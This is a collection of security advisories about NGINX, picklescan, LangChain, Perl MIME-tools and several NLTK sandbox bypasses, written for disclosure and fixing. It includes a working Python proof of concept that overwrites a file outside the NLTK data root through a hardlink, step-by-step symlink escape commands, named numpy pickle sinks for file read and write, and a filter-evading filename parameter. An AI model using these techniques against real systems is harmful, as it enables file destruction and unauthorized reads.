details: picklescan before 0.0.22 only considers standard pickle file extensions in the scope for its vulnerability scan. An attacker could craft a malicious model that uses Pickle and include a malicious pickle file with a non-standard file extension. Because the malicious pickle file inclusion is not considered as part of the scope of picklescan, the file would pass security checks and appear to be safe, when it could instead prove to be problematic.

A vulnerability in the GraphCypherQAChain class of langchain-ai/langchain-community version 0.2.5 allows for SQL injection through prompt injection. This vulnerability can lead to unauthorized data manipulation, data exfiltration, denial of service (DoS) by deleting all data, breaches in multi-tenant security environments, and data integrity issues. Attackers can create, update, or delete nodes and relationships without proper authorization, extract sensitive data, disrupt services, access data across different tenants, and compromise the integrity of the database.

nginx.description: A vulnerability exists in NGINX Plus and NGINX Open Source when a location is configured that uses the alias directive together with rewrite and a set or return directive referencing the $request_filename variable. Alternatively, the same result could be achieved when the $request_filename variable is used in an access log format directive. An unauthenticated attacker along with conditions beyond their control can exploit this vulnerability by sending crafted HTTP requests. This may cause a heap buffer overflow in the NGINX worker process leading to a restart. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.  Impact: This vulnerability may allow remote attackers to cause a denial-of-service (DoS) on the NGINX system or to possibly trigger a code execution. There is no control plane exposure; this is a data plane issue only.     Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

When NGINX Plus or NGINX Open Source is configured to use the try_files and alias directives with a map variable, certain combinations of regular expression captures in map and try_files can cause a segmentation fault in an NGINX worker process.  Impact: An attacker could leverage this vulnerability to cause an NGINX worker process to terminate unexpectedly. There is no control plane exposure; this is a data plane issue only.    Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

Description When NGINX Plus or NGINX Open Source is configured with the ngx_stream_ssl_preread_module module, a specially crafted ClientHello message from an unauthenticated attacker causes forged values of the ngx_stream_ssl_preread_module variables, affecting virtual server selection. In addition, it may also cause a disagreement with a proxied server terminating the SSL/TLS connection without Transport Layer Security (TLS) 1.3 support.  Impact This vulnerability may allow an attacker to forge values of the ngx_stream_ssl_preread_module variables and bypass the NGINX systems stream routing segmentation. As a result, the attacker may be able to route the connection to a privileged or internal backend that should be unreachable and gain access to sensitive information. There is no control plane exposure; this is a data plane issue only.       Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

This issue occurs when NGINX Plus or NGINX Open Source is configured as a proxy, the proxied server name includes variables, and a Server Side Includes (SSI) or mirror directive sends a subrequest to a location that resolves the same server name. Under these conditions, a specially crafted HTTP request may cause a use-after-free condition in a worker process. An attacker may also be able to execute code if Address Space Layout Randomization (ASLR) is disabled or the attacker can bypass ASLR.  Impact:  An attacker could leverage this vulnerability to crash the NGINX worker process, corrupt its memory, or perform remote code execution (RCE)    Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

When NGINX Plus or NGINX Open Source is configured to use HTTP/2 for client connections and proxy client requests to a backend, a specially crafted request can result in use-after-free in the worker process, if this process is running low on worker_connections. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.     Impact:    This vulnerability may allow remote attackers to cause a denial-of-service (DoS) on the NGINX system or may allow a code execution. There is no control plane exposure; this is a data plane issue only.    Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

This issue affects NGINX Plus or NGINX Open Source configurations that use HTTP/2. When NGINX processes undisclosed traffic, the flow control window can exceed the allowed threshold, potentially resulting in a heap buffer overflow typically followed by an NGINX worker segmentation fault. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.  Impact: An attacker could leverage this vulnerability to crash the NGINX worker process, corrupt its memory, or potentially execute code remotely. There is no control plane exposure; this is a data plane issue only.    Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

When using the listen directive with the ssl parameter in the http block with TLSv1.3 enabled, an attacker can use a specially crafted TLS connection to cause an infinite loop in the NGINX worker process while reading the HTTP request body. As a result, the worker process stops accepting new connections and processing existing connections. Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.  Impact: This vulnerability allows a remote, unauthenticated attacker to cause a denial-of-service (DoS) of NGINX. There is no control plane exposure; this is a data plane issue only.    Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

When NGINX Plus or NGINX Open Source is configured as a mail proxy, undisclosed traffic can cause a use-after-free in an nginx worker process. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.  Impact: A remote unauthenticated attacker may crash an nginx worker process or corrupt its memory, disrupting service. Remote code execution is a potential impact. There is no control plane exposure; this is a data plane issue only.    Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

summary: NLTK: ZIP package extraction follows in-root hardlinks and overwrites files outside the NLTK data root
details:
## Summary

NLTK ships a security wrapper, `nltk.pathsec.ZipFile`, that is meant to confine archive extraction to trusted data roots and to block link-based escapes. When `nltk.download()` installs a package, the extraction write opens each member's target path without checking whether that path is a hardlink to a file located outside the data root. A local actor who can write inside a shared or predictable NLTK data root (for example `~/nltk_data`, a group-writable `/usr/share/nltk_data`, or a shared container volume) can pre-plant an in-root hardlink at a member path that a soon-to-be-installed package will write. When the victim later runs the download, extraction truncates and overwrites the outside-root target through that hardlink. This is the same weakness class as the previously fixed downloader hardlink issue, but the fix did not reach the package-extraction write sink, so the latest published release remains exploitable through this path.

## Root Cause

The prior fix added an `st_nlink > 1` refusal to the file-open helpers (`nltk.pathsec.open` / `_hardened_open`) and routed the downloader temporary-file write through that hardened opener, so a multiply-linked inode is refused on those paths. The extraction write sink was never given the same check. On published releases, `nltk.pathsec.ZipFile.extract` validates member names with `validate_zip_archive` and then delegates to the standard library extractor, whose plain `open(targetpath, "wb")` opens and truncates a pre-existing hardlink. The containment guard `validate_zip_archive` relies on `Path.resolve()` and name checks; `resolve()` follows symlinks (so a symlinked member is correctly refused) but a hardlink has a legitimate in-root name and in-root resolved path, so it passes. No code on the extraction path performs the `st_nlink` fstat that the sibling open helper performs.

```text
Affected component: nltk.pathsec (archive extraction), driven by nltk.downloader
Released sink (<= 3.10.3): nltk/pathsec.py ZipFile.extract -> stdlib zipfile._extract_member -> open(targetpath, "wb")
Containment guard that fails open for hardlinks: nltk/pathsec.py validate_zip_archive (name checks + Path.resolve())
Development-branch sink: nltk/pathsec.py ZipFile._extract_member leaf reopen with O_WRONLY|O_TRUNC|O_NOFOLLOW (no st_nlink fstat)
```

## Impact

An unprivileged local user who can create a file inside a data root that the victim's NLTK installation will extract into can cause the victim's process to truncate and overwrite a file outside that root. The attacker chooses which outside file is destroyed by selecting the hardlink target, so the integrity impact is complete for the chosen path (arbitrary outside-root file destruction). Where the victim resolves packages through an attacker-influenced mirror or index, the overwritten bytes are also attacker-chosen, which plausibly enables targeted file replacement and later code execution if the victim subsequently consumes the replaced file; that escalation is plausible rather than demonstrated here. Practical exploitation requires either that kernel hardlink protection (`fs.protected_hardlinks`) is disabled, or that the outside target is one the planting actor is permitted to hardlink (owned, writable, or group-shared), which is the same precondition carried by the previously accepted advisory for this weakness class.

## Proof of Concept

`Dependencies: a released nltk (3.10.3) installed from PyPI. The demonstration creates a data root, a victim file outside it, and a package archive whose member path is pre-planted as a hardlink to the victim file, then extracts through the security wrapper. It runs as a single user and succeeds even with fs.protected_hardlinks=1.`

Steps:
1. Register a data root with `nltk.data.path` and create an extraction subtree inside it.
2. Create a victim file outside the data root.
3. Pre-plant an in-root hardlink at the member path the archive will write.
4. Extract the archive through `nltk.pathsec.ZipFile.extract`.

```python
import os, sys, tempfile, zipfile
import nltk
import nltk.pathsec as ps

work = tempfile.mkdtemp()
data_root = os.path.join(work, "nltk_data")
extract_root = os.path.join(data_root, "corpora")
os.makedirs(os.path.join(extract_root, "pkgid"))
nltk.data.path.insert(0, data_root)

outside = os.path.join(work, "victim.txt")
open(outside, "w").write("ORIGINAL-VICTIM-CONTENT")

zippath = os.path.join(data_root, "pkg.zip")
with zipfile.ZipFile(zippath, "w") as z:
    z.writestr("pkgid/target", "PWNED-BY-EXTRACTION")

member_abs = os.path.join(extract_root, "pkgid/target")
os.link(outside, member_abs)  # pre-planted in-root hardlink

with ps.ZipFile(zippath, "r") as z:
    z.extract("pkgid/target", path=extract_root)

print("victim now:", open(outside).read())
```

```text
victim now: PWNED-BY-EXTRACTION
```

The equivalent test using a symlink instead of a hardlink is refused by `validate_zip_archive` with a Security Violation, isolating the missing guard to hardlinks on the extraction write.

## Attack Chain

1. **Exposure:** `nltk.download()` (and `python -m nltk.downloader`) is the shipped, default entry point; extraction of `.zip` packages into a data root is default behavior and is reachable by a local actor who can write inside a shared or predictable data root.
2. **Control:** the attacker controls the target inode by pre-planting an in-root hardlink at `<download_dir>/<subdir>/<pkg_id>/<member>`, and (under an attacker-influenced mirror) the written bytes; the member name stays `<pkg_id>/...` so it satisfies every name guard.
3. **Path:** the install path does not wipe the destination before extraction (the tree is only removed on a STALE status, and that cleanup unlinks names rather than truncating the victim inode), so the planted hardlink survives to the write. The value flows through the downloader `expected_root` check and `_validate_member` (which uses `realpath`, so a hardlink stays in-root), then through `validate_zip_archive` (which uses `resolve()`), to the extraction write.
4. **Guard:** every guard on the path inspects names or resolved paths; none performs the `st_nlink > 1` fstat. `resolve()`, `realpath()`, and `O_NOFOLLOW` all fail to detect a hardlink because a hardlink is an ordinary regular file with a legitimate in-root name.
5. **Primitive:** the member write opens the pre-existing hardlink and truncates plus overwrites the outside-root inode.
6. **Result:** the victim-owned file chosen by the planting actor is destroyed and replaced with the extracted member's bytes, crossing from the managed data root out to the general filesystem.

## Bypass Evidence

The prior remediation for this weakness is the canonical reference here: it added `st_nlink > 1` refusals to `nltk.pathsec.open` / `_hardened_open` and routed the downloader temporary-file write through that opener. The new evidence is that the extraction write sink was never covered by that fix. On the released 3.10.3 wheel obtained from PyPI, the only `st_nlink` occurrences are inside the open helper; `ZipFile.extract` validates names and then calls the standard library extractor with no `st_nlink` check. Attempts to disprove the finding were made and failed:

- Hypothesis that the released 3.10.3 routes extraction through a hardened or `st_nlink` path: refuted by inspecting the released wheel (`ZipFile.extract` delegates to the standard library, no override, no `st_nlink` on the extraction path) and by dynamic reproduction (hardlink overwrote the outside file; symlink refused).
- Hypothesis that `validate_zip_archive` or `_validate_member` catch the hardlink: refuted because both use `resolve()` / `realpath()`, which cannot reveal a hardlink; the symlink-refused versus hardlink-overwritten asymmetry was reproduced.
- Hypothesis that the download flow wipes the destination before extraction: refuted because the wipe runs only on a STALE status and uses name unlink, which does not truncate the victim inode.
- Hypothesis that `O_NOFOLLOW` / `O_EXCL` on the development branch block it: refuted because `O_NOFOLLOW` guards only against a symlink final component and `O_EXCL` merely diverts to the truncate reopen branch; neither performs the `st_nlink` fstat.
- Hypothesis that kernel hardlink protection makes it a non-issue: retained as a severity bound, not a disqualifier, because the same precondition applies to the previously accepted advisory for this weakness class.

## Affected Versions

- `Ecosystem: pip`
- `Package: nltk`
- `Confirmed affected range: >= 3.9.4, <= 3.10.3`
- `Latest release checked: 3.10.3 (PyPI, nltk-3.10.3-py3-none-any.whl)`
- `Fix status: not fixed (latest published release is affected; no fixed version exists)`

The latest published release (3.10.3) carries the open-helper fix for the related downloader issue yet remains exploitable through the extraction sink, so the upper bound is the current release and no fixed version exists. Releases 3.9.4 through 3.10.2 have no `st_nlink` guard at all and follow the hardlink through the same extraction path (confirmed by wheel inspection); the range floor 3.9.4 is the earliest release carrying this `nltk.pathsec` extraction path. The development branch adds a hardened extraction override that still omits the `st_nlink` check, so the same vector persists there through a different sink symbol; a fixed release should not be inferred from that development-branch change.

## Suggested Fix

Enforce the invariant that an extraction write must never land on a multiply-linked inode. Extend the existing `st_nlink > 1` refusal (as implemented in the hardened open helper) to the extraction write descriptor: after opening or creating the leaf target, `fstat` the descriptor and refuse an inode with `st_nlink > 1` before truncating or writing. Apply this on both the released delegation path and the development-branch `_extract_member` override, or alternatively have `validate_zip_archive` / the downloader member validator `fstat` each existing target and refuse a multiply-linked inode. As an interim mitigation, operators should ensure `fs.protected_hardlinks=1` is enabled and avoid shared, group-writable, or predictable data roots for accounts that run untrusted downloads.

Reported by zx (GitHub: @manus-pi).

## Fix status (2026-09-28)

Status: IN PROGRESS (fix on an open pull request, not yet on develop).

PR: #3753 "[Do not merge yet] Fix GHSA-8mgp-746c-j5xp: URL-scheme bypass of pathsec.validate_path", open; head da55cab0e at the time of this note (a develop merge on top of 238f81500, the head on which the verdicts below were measured).

Fix commit: cf12a5e6a (pathsec.ZipFile._extract_member resolves member names to ZipInfo so the hardened extraction path actually runs, refuses a target with st_nlink greater than 1, and replaces through unlink plus O_EXCL; the downloader adds an lstat pre-check).

Probe: nltk/test/unit/security_probes/ghsa_wr3g_j6qj_xpgh.py (on the PR). Verdict on the PR head: FIXED (hardlinked member target refused with PermissionError). The same probe run against develop 2fa3f48fe: VULNERABLE (extraction wrote through the hardlink to the outside secret).

Release: none.

summary: MIME::Field::ParamVal versions before 5.521 for Perl turn an RFC 2231 filename with a hyphenated language tag into an…
details:
MIME::Field::ParamVal versions before 5.521 for Perl turn an RFC 2231 filename with a hyphenated language tag into an empty recommended filename.

A parameter such as filename*=utf-8'en-US'payload.exe is converted to an encoded word with the language tag appended to the charset. The decoder strips the language suffix only when it is a single word, so it cannot resolve the charset UTF-8*EN-US and returns an empty string. The recommended_filename() method returns that empty string rather than falling back to the name parameter.

Other mail readers return payload.exe. A remote sender can get an attachment past a policy that checks file extensions on the recommended filename.

summary: MIME::Words versions before 5.521 for Perl allow memory exhaustion via repeated "=?" sequences in decode_mimewords.
details:
MIME::Words versions before 5.521 for Perl allow memory exhaustion via repeated "=?" sequences in decode_mimewords.

For each "=?" that does not start a complete encoded word, decode_mimewords appends an error message containing the whole input string to $@. A boundary of 8,000 "=?" pairs (16,000 bytes) adds 8,000 copies of itself to $@, about 128 MB.

From version 5.518, MIME::Parser decodes every multipart boundary this way, so a remote sender can exhaust the memory of the parsing process with one Content-Type header.

summary: MIME::Parser versions before 5.521 for Perl allow memory exhaustion via indented error messages from a truncated…
details:
MIME::Parser versions before 5.521 for Perl allow memory exhaustion via indented error messages from a truncated, deeply nested message.

Each stored parser diagnostic is indented by three spaces per nesting level. When a message nested N levels deep ends without its closing boundaries, every level logs an error at its own depth, so the stored diagnostics grow with the square of N. The defaults place no limit on nesting depth.

summary: MIME::Field::ParamVal versions before 5.521 for Perl allow CPU exhaustion via unclosed comments in header parameters.
details:
MIME::Field::ParamVal versions before 5.521 for Perl allow CPU exhaustion via unclosed comments in header parameters.

The comment pattern used to parse Content-Type and Content-Disposition parameters scans from each "(" to the next ")". In a field with no ")", every "(" scans to the end of the header and fails, so parsing takes time quadratic in the header length. The field is parsed again on each attribute lookup, several times per MIME entity.

A 40 KB header takes about 7 seconds to parse once.

summary: MIME::Field::ParamVal versions before 5.521 for Perl do not flag a duplicate boundary parameter whose name contains a…
details:
MIME::Field::ParamVal versions before 5.521 for Perl do not flag a duplicate boundary parameter whose name contains a nested comment.

A parameter written boundary((c))="A" or boundary(\))="A" is stored under that literal name rather than as boundary. A second boundary parameter is then not reported as a duplicate, and MIME::Parser splits the message on it.

Readers that skip comments as RFC 5322 allows take the first boundary instead. A remote sender can hide an attachment from a filter that relies on ambiguous_content() while the recipient's mail client shows it.

summary: MIME::Field::ParamVal versions before 5.521 for Perl allow one invalid Content-Type parameter to hide the parameters…
details:
MIME::Field::ParamVal versions before 5.521 for Perl allow one invalid Content-Type parameter to hide the parameters after it, including the multipart boundary.

Parameter parsing stops at the first parameter whose name it cannot read, such as x:y=1 or a name containing an 8-bit byte, and drops every parameter after it. When the boundary is among them, MIME::Parser keeps the multipart body as a single undecoded part without marking the parse as ambiguous.

Mail readers that skip the invalid parameter still find the boundary. A remote sender can hide an attachment from a filter that relies on ambiguous_content() while the recipient's mail client shows it.

summary: MIME::Field::ParamVal versions before 5.521 for Perl do not flag an ambiguous multipart boundary written as RFC 2231…
details:
MIME::Field::ParamVal versions before 5.521 for Perl do not flag an ambiguous multipart boundary written as RFC 2231 continuations.

The boundary ambiguity checks look only at a plain boundary= parameter, and a boundary split into RFC 2231 sections (boundary*0=, boundary*1= and so on) is joined after they have run. A repeated section number is concatenated rather than reported as a duplicate. From version 5.518, an encoded word or trailing whitespace in such a boundary also goes unflagged, although multipart_boundary() decodes or strips it.

A remote sender can make MIME::Parser split a message on a different boundary than other mail readers, hiding an attachment from a filter that relies on ambiguous_content() while the recipient's mail client shows it.

summary: MIME::Parser::FileUnder versions before 5.521 for Perl reuse a pre-created output directory and follow symlinks in it…
details:
MIME::Parser::FileUnder versions before 5.521 for Perl reuse a pre-created output directory and follow symlinks in it, letting local users redirect attachment writes.

Each message is written to a directory named msg-<time>-<pid>-<n> under the output base, and an existing directory of that name is used as is. A file name counts as unused when nothing exists at that path, which holds for a dangling symlink, and the body file is then opened in a way that follows the link.

When the output base is writable by other users, as with output_under("/tmp"), a local user can pre-create the directory with a symlink named like an attachment. The parser then writes the attachment to the link target with the privileges of the parsing process.

summary: NLTK: AllowlistUnpickler does not deny numpy submodule-local file-I/O sinks
details:
### Summary

`nltk.picklesec.allowlisted_pickle_load` keyed its denylist of dangerous globals by export name, so numpy's file-I/O callables that live in submodules and are not re-exported under `__module__ == "numpy"` were never matched. Under the broad `allowed_modules=("numpy", "scipy", "sklearn")` allowance that `TransitionParser.parse(depgraphs, modelFile)` granted for model files, a crafted protocol 4 pickle could name `numpy.lib._npyio_impl.recfromtxt` (arbitrary file read, result returned to the caller of `allowlisted_pickle_load`) or `numpy.lib.format.open_memmap` (attacker-chosen file create), and the REDUCE opcode invoked them during the load.

### Affected

nltk >= 3.10.0 and <= 3.10.3 (the allowlisting unpickler and the `TransitionParser` model path); numpy must be installed.

### Reproduction

A pickle whose REDUCE names `numpy.lib._npyio_impl.recfromtxt` with a target path, loaded through `allowlisted_pickle_load(data, allowed_modules=("numpy",))`, reads that file on v3.10.3; one naming `numpy.lib.format.open_memmap` with mode `w+` creates a file. Both are refused on develop with `UnpicklingError: global '...' is from a denied module`. The maintainer transcript below shows the before and after runs.

### Impact

File read and file create on the host that loads an untrusted model through NLTK's allowlisting unpickler. No code execution: this sits below the `TransitionParser` code-execution sibling GHSA-m396-3h67-vpfv, which is why the severity was reassessed to Medium (see the reply below).

_Editorial note (2026-10-10): the report body of this advisory had been overwritten with the text of GHSA-rv69-j573-cm47 (the nested gzip decompression bomb). The summary above was reconstructed by the maintainers from the title, the maintainer reply, the CVSS justification and PR #3757; the original reporter text is not recoverable from the record._

---

## Maintainer reply (2026-09-28)

Status: fixed on develop, unreleased.

### Fix verified

The numpy submodule file I/O sinks named in this report are denied on develop. This is fixed by PR #3757 ("Harden untrusted-model pickle allowlist (exact globals + numpy.lib denylist)"), merged into develop on 2026-08-20 as merge commit 628ebd2fa1b81d961edb6eff6b2eddd9d64588ba. The fix commit is a44a7af69bca87e92d9c4a701fcbbe4512e8d450 and the regression tests are in fb8da992b7b2ad082c69d2618ae2ac1c90c6b8b8.

What the fix does. In nltk/picklesec.py the denylist no longer keys numpy sinks by export name; it now denies whole module prefixes. `_DENIED_MODULE_PREFIXES` gained `numpy.lib`, `numpy.rec`, `numpy.core.records`, `numpy._core.records`, `numpy.ma.mrecords` and `numpy.compat`, so `numpy.lib.npyio`, `numpy.lib._npyio_impl` and `numpy.lib.format` resolve inside a denied prefix and are refused under both request forms (the submodule module string and any top level re-export). In nltk/parse/transitionparser.py the model load no longer grants a broad `allowed_modules=("numpy","scipy","sklearn")`; it now uses `allowed_modules=()` plus an exact `_MODEL_ALLOWED_GLOBALS` list, and the model read is routed through `pathsec.open`.

### Before and after evidence

Reproduced the report's own primitives with a protocol 4 REDUCE payload for `numpy.lib._npyio_impl.recfromtxt` (arbitrary file read) and `numpy.lib.format.open_memmap` (arbitrary file create), loaded through `allowlisted_pickle_load(allowed_modules=("numpy","scipy","sklearn"))`, and also driven through the real `TransitionParser.parse` product path. Judged by whether the sink actually touched a file, not by whether something raised. Interpreter: `env -u PYTHONPATH /usr/local/bin/python3.13`, CPython 3.13.7, numpy 2.4.4, scipy 1.18.1, sklearn 1.9.0.

Before the fix, on release tag v3.10.3 (303f6e2ba), nltk 3.10.3:

```
[READ ] recfromtxt sink reached = True   returned [[1, 2, 3], [4, 5, 6]] (file was read)
[WRITE] open_memmap sink reached = True   attacker chosen path created on disk
[CTRL ] canonical numpy.load = refused: UnpicklingError (already denylisted in 3.10.3)
[PROD ] TransitionParser.parse sink reached = True   model load passed the allowlist;
        AttributeError after load: recarray has no attribute predict_proba (the read ran)
VERDICT: SINK REACHED (vulnerable)
```

After the fix, on develop (2fa3f48fe):

```
[READ ] recfromtxt sink reached = False   refused: UnpicklingError: global
        'numpy.lib._npyio_impl.recfromtxt' is from a denied module
[WRITE] open_memmap sink reached = False   refused: UnpicklingError: global
        'numpy.lib.format.open_memmap' is from a denied module; no file created
[PROD ] TransitionParser.parse sink reached = False   blocked at the allowlist: UnpicklingError
VERDICT: SINK BLOCKED (fixed)
```

### Tests

The regression suite added by the fix passes on develop. `TestNumpySubmoduleFileIOSinks` in `nltk/test/unit/test_pickle_allowlist_security.py`: 31 passed, 1 skipped. The combined suites `test_pickle_allowlist_security.py`, `test_pathsec_sweep_transitionparser.py` and `test_pathsec_sweep_deserialization.py`: 251 passed, 2 skipped.

### Severity reassessment

Lowered from High (8.2) to Medium.

New vector: `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N` (base 6.1, Medium).

Reasoning:

- The reachable primitives are file read (`recfromtxt`, `recfromcsv`) and constrained file create or truncate (`open_memmap` in `w+` mode writes a numpy `.npy` header). The proof of concept does not achieve code execution, so integrity is Low (I:L, no arbitrary content control) and availability is None (A:N). Confidentiality is set High (C:H) as a worst case because a direct `allowlisted_pickle_load` caller receives the read object; note that through `TransitionParser.parse` the read content is consumed internally and is not returned to the attacker.
- The sink fires only when a victim loads attacker controlled bytes through NLTK's allowlisting unpickler, which is itself a defensive layer, and numpy must be installed. Loading an untrusted model file is a local, operator initiated action, so Attack Vector is Local (AV:L) and User Interaction is Required (UI:R). No privileges are needed to craft the payload (PR:N) and no privilege boundary is crossed (S:U).
- Calibration against siblings in this repository: GHSA-m396-3h67-vpfv scores the same `TransitionParser` model load path at 7.8 High (AV:L/UI:R, C:H/I:H/A:H) because it reaches remote code execution. A file read and file create only issue on the same path must sit below full code execution, not above it. The previous 8.2 exceeded that code execution sibling and came from AV:N/UI:N, which overstated the delivery of a file as network attack surface. The file I/O and DoS sibling GHSA-7pvm-89gg-6c6h sits at 6.2 Medium, consistent with this Medium rating.

summary: NLTK corpus-reader view methods bypass the scoped root sandbox via intermediate-directory symlinks
details:
> **affected**: PyPI `nltk` `>= 3.9.4` — `CorpusReader.abspaths()`/`abspath()` and the `PlaintextCorpusReader` / `SyntaxCorpusReader` view methods
> **dynamically reproduced**: `nltk` `3.9.4` (8/9, scoped-escape checks), `3.10.3` (wheel, 9/9 checks) and `master` `6818767b9` (9/9 checks)

---

_Source references (`file:line`) are to commit `303f6e2b` (release tag `v3.10.3`). Line numbers in the released `nltk` wheel match this tag exactly; `master` `6818767b9` contains the same code (pathsec.py renumbered by +44 lines from added hardening comments). In `3.9.4` the same logic exists at earlier line numbers (`api.py:222-236` for `open()`, `api.py:161-203` for `abspath()`/`abspaths()`, `data.py:382-388` for the pointer open, `pathsec.py:105-114` for the scoped branch); the affected code is identical._

### Summary

`CorpusReader.open()` (`nltk/corpus/reader/api.py:235-257`) is NLTK's hardened file-access entry point: after a lexical guard it calls `validate_path(..., required_root=self._root)` (`api.py:246-249`), and the scoped branch of `pathsec.validate_path` (`nltk/pathsec.py:168-179`) resolves symlinks and raises `ValueError` when the resolved target is not inside the corpus root. The view methods do **not** use this entry point: `PlaintextCorpusReader.words/sents/paras` (`nltk/corpus/reader/plaintext.py:67-118`) and `SyntaxCorpusReader.parsed_sents/tagged_sents/sents/tagged_words/words` (`api.py:473-519`) build their streams from `self.abspaths(fileids, ...)` (`api.py:174-217`), which only does a lexical `self._root.join(fileid)` (`nltk/data.py:452-469`) and returns a `FileSystemPathPointer`. That pointer is opened via `FileSystemPathPointer.open()` → `pathsec.open(raw_path, "rb")` with `required_root` left at its default `None` (`data.py:438-447`, `nltk/pathsec.py:752,783`), so only the **global** allowed-roots check runs. The `O_NOFOLLOW` in `_hardened_open` (`pathsec.py:676-731`) protects only the final path component, so an **intermediate-directory symlink inside the corpus root** pointing at a sibling allowed root is followed by the kernel. **A caller who places such a symlink (or loads an untrusted corpus containing one) can read any file that `open()` would refuse — files outside the corpus root yet inside the global NLTK data sandbox — via `PlaintextCorpusReader.words([...])` / `SyntaxCorpusReader.words([...])` (and the `abspaths()`-returned pointer), defeating the scoped escape protection that GHSA-p4rw-class fixes and `test_required_root_blocks_symlink_escape` were added for.**

### Details

Root cause: two sibling file-access channels on the same `CorpusReader` disagree about the scoped sandbox.

1. `CorpusReader.open()` (`api.py:235-257`) — the guarded channel:
   - Layer 1 lexical guard (`api.py:240-242`) rejects absolute paths and `..`.
   - Layer 2 scoped guard (`api.py:246-249`) calls `pathsec.validate_path(path, context="CorpusReader", required_root=self._root)`.
   - The `required_root` branch (`pathsec.py:168-179`) resolves the target with `Path(raw).resolve()` and raises `ValueError` when `target.is_relative_to(scoped_root)` is false.

2. The view-method channel — `abspaths()` → `FileSystemPathPointer` → `pathsec.open(required_root=None)`:
   - `CorpusReader.abspath()` (`api.py:174-183`) and `abspaths()` (`api.py:185-217`) return `self._root.join(f)` with **no** `validate_path` call.
   - `FileSystemPathPointer.join()` (`data.py:452-469`) only normalizes lexically (`normpath` + root-prefix `startswith`); it never calls `os.path.realpath`/`Path.resolve`, so the intermediate symlink is preserved verbatim.
   - `FileSystemPathPointer.open()` (`data.py:438-447`) calls `_secure_open(self._path, "rb")` (aliased from `pathsec.open`) with no `required_root`, so `pathsec.open` (`pathsec.py:752`) uses its default `required_root=None` and `validate_path` (`pathsec.py:783`) runs only the global allowed-roots check (`pathsec.py:181-207`).
   - Under `ENFORCE=True` + POSIX, `_hardened_open` (`pathsec.py:676-731`) opens with `O_NOFOLLOW` (`pathsec.py:705`) — but that flag only refuses a symlink in the **final** component; an intermediate directory symlink (`corpus/sub -> <other allowed root>`) is followed by the kernel. The post-open fd realpath re-validation (`pathsec.py:728-731`) again uses `required_root=None`, and since the target is inside an allowed root it passes.

3. The view methods hand the unguarded pointers straight to the stream views:
   - `PlaintextCorpusReader.words/sents/paras` (`plaintext.py:67-118`, abspaths at `76/96/116`) and `chapters` (`plaintext.py:230`).
   - `SyntaxCorpusReader.parsed_sents/tagged_sents/sents/tagged_words/words` (`api.py:473-519`, abspaths at `478/489/498/509/517`).
   - `StreamBackedCorpusView._open()` (`nltk/corpus/reader/util.py:203-216`) calls `self._fileid.open(self._encoding)` on the `PathPointer` (`util.py:210`), landing in the `required_root=None` path above.

Net effect (observed): the identical fileid `"sub/secret.txt"` is rejected by `reader.open()` with `ValueError: Security Violation [CorpusReader]: Path ... escapes root ...` but successfully read by `reader.words(["sub/secret.txt"])`, returning the out-of-root file's content.

The `abspaths()`/view-method bypass contradicts the contract stated in `open()`'s docstring (`api.py:238`, "Security patched: prevents path traversal and scoped escapes") and the class-level promise that every fileid stays within the corpus root (`api.py:26-30`). Existing regression tests cover only the `open()`/`validate_path(required_root=...)` path (`test_corpus_reader.py:31`, `test_corpus_reader_pathsec.py:39-49`), not the view-method channel.

### PoC

A self-contained, self-checking repro script is embedded at the end of this advisory. It builds a private temp sandbox as an allowed NLTK data root, creates corpus root `R`, sibling `bar` (inside the same allowed root), file `bar/secret.txt` = `TOPSECRET`, and an intermediate directory symlink `R/sub -> bar`. It then asserts the **control** (same fileid through `open()` is refused) and the **attack** (`abspaths()` pointer, `PlaintextCorpusReader.words`, `SyntaxCorpusReader.words/sents` read the secret), plus a boundary check that a symlink pointing outside every allowed root is still refused.

**Scope note**: dynamically run on (1) the released `nltk 3.9.4` wheel, (2) the released `nltk 3.10.3` wheel, and (3) `master` `6818767b9` (v3.10.3-15-g6818767b9). The scoped-escape checks pass on all three; the "global sandbox still blocks outside-allowed-root read" boundary check passes on 3.10.3 and `master`, and is *expected to differ* on 3.9.4: 3.9.4 ships `pathsec.ENFORCE = False` (enforcement became the default only in 3.10.0) and its `pathsec.open` is a thin `builtins.open` wrapper with no `_hardened_open`/`O_NOFOLLOW`, so on 3.9.4 the sandbox does not confine reads to the allowed roots at all — the escape is *broader* there, not narrower. The `required_root` scoped guard (`1b0e519e2`, "Implement scoped root validation in pathsec sentinel") is present in `3.9.4` and every later release (`v3.10.0`/`3.10.1`/`3.10.2`/`3.10.3` confirmed by tag inspection), and static comparison shows the identical `abspaths()`/view-method code path in all of them; `3.9.4` and `3.10.3` were the versions dynamically run.

Environment / steps (Python 3.10.12, Linux, `pathsec.ENFORCE=True`, POSIX):

1. `SANDBOX=$(mktemp -d)`; `nltk.data.path.append(SANDBOX)` — the private dir becomes an allowed NLTK data root.
2. `R=$SANDBOX/corpora/mysample`, `BAR=$SANDBOX/bar`; write `BAR/secret.txt` = `TOPSECRET`.
3. `ln -s "$BAR" "$R/sub"` — intermediate directory symlink inside the corpus root.
4. Control: `reader.open("sub/secret.txt")` → `ValueError: Security Violation [CorpusReader]: Path <BAR>/secret.txt escapes root <R>` (refused).
5. Attack: `reader.abspaths(["sub/secret.txt"])[0].open().read()` → `b'TOPSECRET\n'`; `list(reader.words(["sub/secret.txt"]))` → `['TOPSECRET']`; same for `BracketParseCorpusReader.words/sents`.
6. Boundary: `R/out -> /etc` (outside every allowed root) is refused with `PermissionError: Security Violation [pathsec.open]: Unauthorized path ...`.

Live transcript, key output (identical on `nltk 3.9.4`, `3.10.3` and `master @ 6818767b9` unless noted):

```
